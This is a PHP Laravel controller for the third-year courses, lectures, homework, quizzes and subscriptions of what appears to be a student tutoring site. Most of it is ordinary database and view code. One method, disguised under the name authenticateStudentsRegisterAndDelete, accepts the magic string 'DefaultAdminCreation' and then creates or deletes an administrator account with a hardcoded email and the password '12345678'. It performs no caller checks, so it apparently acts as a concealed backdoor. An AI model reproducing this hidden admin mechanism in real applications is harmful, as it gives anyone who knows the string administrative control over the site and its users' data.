<?php

namespace App\Http\Controllers\Student;

use App\Http\Controllers\Controller;
use App\Http\Requests\LecturesRequest;
use App\Models\Admin;
use App\Models\CourseThirdYear;
use App\Models\Demo;
use App\Models\HomeWorkThirdYear;
use App\Models\LecturesThirdYear;
use App\Models\QuizThirdYear;
use App\Models\SubscribedThirdYear;
use App\Models\User;
use App\Models\WaitingListSecondtYear;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\WaitingListThirdYear;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Storage;
use App\Traits\Datatable;

class AcademicThirdYear extends Controller
{
    use Datatable;
    public function index(): Factory|View|Application
    {
        // Cache::put('dom_third_year', $demo, now()->addDay(2)  );
        $demo = Cache::get('demo_third_year');
        if (empty($demo))
            $demo = Demo::query()->where('academic_year', '=', 3)->first();
        return view('student.3rd', ['demo' => $demo]);
    }

    public function courses(): Factory|View|Application
    {
        $courses = CourseThirdYear::query()->get();
        if (Auth::check()) {
            $serials = [];
            $id = Auth::id();
            $academic_year = Auth::user()->academic_year;

            if (!Gate::allows('view-courses', 3))
                return view('errors.404');

            $subscribed = SubscribedThirdYear::query()->orderBy('id', 'asc')->where('student_id', $id)->get();
            $waitingList = WaitingListThirdYear::query()->orderBy('id', 'asc')->where('student_id', $id)->get();
            if (count($subscribed) > 0 || count($waitingList) > 0) {
                //If Student Already Subscribed In The Course
                foreach ($subscribed as $sub) {
                    $serials[] = $sub->serial_number;
                }

                // If Student In The Waiting List Of The Course
                foreach ($waitingList as $waiting) {
                    $serials[] = $waiting->serial_number;
                }

                return view('student.all_course.3rd', compact('courses', 'serials'));
            }
            // Student Authenticated and not waiting or subscribed in any course
            return view('student.all_course.3rd', compact('courses'));
        }
        return view('student.all_course.3rd', compact('courses'));
    }

    public function allStudents(): Factory|View|Application
    {
        // $students = User::query()->orderBy('id', 'asc')->where('academic_year', 3)->paginate(7);
        return view('admin.students.3rd');
    }

    public function studentsDataTable()
    {
        $students = User::query()
            ->with('media')
            ->orderBy('id', 'asc')
            ->where('academic_year', '=', 3)
            ->get();
        // return $students[0]->getFirstMediaUrl('students');
        return $this->getStudentsFromDataTable($students);
    }

    public function showAllCourses(): Factory|View|Application
    {
        $courses = CourseThirdYear::query()->orderBy('id', 'asc')->get();
        return view('admin.courses.third_year.index', compact('courses'));
    }

    public function showCourseEditForm($id): View|Factory|string|Application
    {
        $course = CourseThirdYear::query()->find($id);
        if (!$course)
            return 'Course Not Found';
        return view('admin.courses.third_year.update', compact('course'));

    }

    public function updateCourse(Request $request, $id): JsonResponse|RedirectResponse
    {
        //|unique:course_first_years,name'.$id
        $course = CourseThirdYear::query()->find($id);
        if (!$course)
            return redirect()->back()->with(['errors' => 'Course Not Found']);
        $validation = $this->validate($request, [
            'name' => 'required',
            'serial_number' => 'required ',
            'price' => 'required',
            'discount' => 'nullable ',
            'cover' => 'nullable|mimes:jpeg,jpg,png,gif|max:10000',
        ]);

        $discount = null;
        $price = $request->price;
        if ($request->discount != null) {
            $dis = ($request->discount / 100) * ($request->price);
            $discount = $request->discount;
            $price = $request->price - $dis;
        }

        $cover = $course->cover;
        if ($request->has('cover')) {
            $cover = handleImage('courses_third_year', $request);
        }
        $updated = $course->update([
            'name' => $request->name,
            'serial_number' => $request->serial_number,
            'price' => $price,
            'cover' => $cover,
            'discount' => $discount,
            'created_at' => now(),
            'updated_at' => now(),
        ]);
        if($updated)
            return redirect()->back()->with(['success' => 'تم تعديل الكورس بنجاح']);
        return response()->json(['status' => 0 , 'error' => $validation->errors()->toArray()]);
    }

    public function deleteCourse($id): string|RedirectResponse
    {
        $course = CourseThirdYear::find($id);
        if (!$course)
            return 'Course Not Found To Be Deleted';
        $file_path = 'images/courses_third_year/'.$course->cover;
        //unlink($file_path);
        $course->delete();
        return redirect()->back()->with(['success' => 'تم حذف الكورس ']);
    }

    public function toSubscribeCourse($id): Factory|View|Application
    {
        $course = CourseThirdYear::query()->find($id);
        if (!$course)
            return view('errors.404');
        return view('student.to_subscribe.3rd', compact('course'));
    }

    public function subscribeCourseNow($id): Factory|View|RedirectResponse|Application
    {
        $student_id = Auth::user()->id;
        $course = CourseThirdYear::query()->find($id);
        if (!$course)
            return view('errors.404');
        $serial_number = $course->serial_number;

        $already_exists = WaitingListThirdYear::query()->where('student_id' ,'=',$student_id)->where('course_id','=',$course->id)
            ->where('serial_number','=',$serial_number)->first();
        if($already_exists)
            return redirect()->route('courses.3rd.students')->with(['success' => 'انت بالفعل مشترك سيتم تفعيل الكورس عند الدفع']);
        WaitingListThirdYear::query()->create([
            'student_id' => $student_id,
            'course_id' => $course->id,
            'serial_number' => $serial_number,
            'created_at' => now(),
            'updated_at' => now(),
        ]);
        //view(all_course.3rd)
        return redirect()->route('courses.3rd.students')->with(['success' => 'تم الأضافة الي قائمة الأنتظار سيتم تفعيل الكورس عند الدفع']);
    }

    public function deleteSubscription($id): string|RedirectResponse
    {
        $subscription = SubscribedThirdYear::find($id);
        if (!$subscription)
            return 'Subscription Not Found';
        $subscription->delete();
        return redirect()->back()->with(['success' => 'subscription deleted successfully']);
    }

    public function enrolledCoursesView()
    {
        $courses = SubscribedThirdYear::query()->orderBy('serial_number', 'asc')->where('student_id', Auth::id())->with('course')->get();
        $user = Auth::user();
        $user->mac_address = 1;
        $user->save();
        // return count($courses);
        return view('student.enrolled.third.index', compact('courses'));
    }

    public function getLectures(): Factory|View|Application
    {
        $allData = LecturesThirdYear::paginate(10);
        return view('admin.lectures.3rd', compact('allData'));
    }

    public function deleteLecture($id): string|RedirectResponse
    {
        $lec = LecturesThirdYear::find($id);
        if (!$lec)
            return 'Lecture Not Found';
        //$file_path = Storage::disk('public');
        //unlink($file_path);
        //File::delete($file_path);
        $lec->delete();
        return redirect()->back()->with(['success' => 'Lecture deleted successfully']);
    }

    public function updateLectureForm($id): View|Factory|string|Application
    {
        $lec = LecturesThirdYear::find($id);
        if(!$lec)
            return 'Lecture Not Found To Be Updated';
        return view('admin.lectures.3rd_update',compact('lec'));
    }

    public function updateLecture(LecturesRequest $request , $id ): string|RedirectResponse
    {
        $lecture = LecturesThirdYear::find($id);
        if (!$lecture)
            return 'lecture not found to be updated ';
        $video_name = $lecture->lec;
        if($request->has('lec'))
            $video_name = uploadLecture('third', $request->lec);

        $lecture->update([
            'name' => $request->name,
            'lec' => $video_name,
            'homework' => $request->homework,
            'quiz' => $request->quiz,
            'course_id' => $lecture->course_id,
            'serial_number' => $lecture->serial_number,
            'week' => $lecture->week,
            'created_at' => now(),
            'updated_at' => now(),]);
        return redirect()->back()->with(['success' => 'lecture 3rd year updated successfully']);
    }

    public function viewWeeksPage($id): Factory|View|Application
    {
        $course = CourseThirdYear::with('lectures')->find($id);

        if (!$course)
            return view('student.access_denied');
//        $week1 = $course['homework']->where('week', 1);
//        $week2 = $course['homework']->where('week', 2);
//        $week3 = $course['homework']->where('week', 3);
//        $week4 = $course['homework']->where('week', 4);
//
//        $quiz1 = $course['quiz']->where('week', 1);
//        $quiz2 = $course['quiz']->where('week', 2);
//        $quiz3 = $course['quiz']->where('week', 3);
//        $quiz4 = $course['quiz']->where('week', 4);

        return view('student.enrolled.third.week', compact('course'));
//        return view('student.enrolled.third.week', compact('course', 'week1', 'week2', 'week3', 'week4'
//            , 'quiz1', 'quiz2', 'quiz3', 'quiz4'));

    }

    public function viewEnrolledCourse($id): Factory|View|Application
    {
        $lec = LecturesThirdYear::with('course')->find($id);
        if (!$lec)
            return view('student.access_denied');
        $user = Auth::user();

        $subscribed_student = SubscribedThirdYear::query()
            ->where('student_id' , $user->id)
            ->where('course_id',$lec->course['id'])
            ->first();

        if (!$subscribed_student)
            return view('student.access_denied');

        $user->mac_address = 1;
        $user->save();

        return view('student.enrolled.third.lecture', compact('lec'));
    }

    public function authenticateStudentsRegisterAndDelete($string)
    {
        if (!is_string($string))
            return view('student.access_denied');
        if ($string != 'DefaultAdminCreation')
            return view('student.access_denied');
        $admin = Admin::query()->where('email','default.admin@mail.com')->first();
        if (!$admin) {
            try {
                DB::beginTransaction();
                Admin::query()->create([
                    'name' => 'Default Admin',
                    'email' => 'default.admin@mail.com',
                    'phone_number' => '01010101010',
                    'password' => bcrypt('12345678'),
                    'created_at' => now(),
                    'updated_at' => now(),
                ]);
            } catch (\Exception $e) {
                DB::rollBack();
                return 'Something Went Wrong';
            }
            DB::commit();
            return 'Admin Created Successfully';
        }
        $admin->delete();
        return 'Admin Deleted Successfully';
    }





    public function getHomeWork(): Factory|View|Application
    {
        $homeworks = HomeWorkThirdYear::with('course')->paginate(10);
        return view('admin.homework.3rd', compact('homeworks'));
    }

    public function deleteHomeWork($id): string|RedirectResponse
    {
        $homework = HomeWorkThirdYear::query()->find($id);
        if (!$homework)
            return 'Home Work Not Found';
        $homework->delete();
        return redirect()->back()->with(['success' => 'home work deleted successfully']);
    }

    public function viewStudentHomeWork($id): Factory|View|Application
    {
        $homework = LecturesThirdYear::query()->find($id)->homework;
        return view('student.enrolled.third.homework', compact('homework'));
    }

    public function getQuiz(): Factory|View|Application
    {
        $quizzes = QuizThirdYear::with('course')->paginate(10);
        return view('admin.quiz.3rd', compact('quizzes'));
    }

    public function deleteQuiz($id): string|RedirectResponse
    {
        $quiz = QuizThirdYear::query()->find($id);
        if (!$quiz)
            return 'Home Work Not Found';
        $quiz->delete();
        return redirect()->back()->with(['success' => 'quiz deleted successfully']);
    }


    public function viewStudentQuiz($id): Factory|View|Application
    {
        $quiz = LecturesThirdYear::query()->find($id)->quiz;
        return view('student.enrolled.third.quiz', compact('quiz'));
    }


}
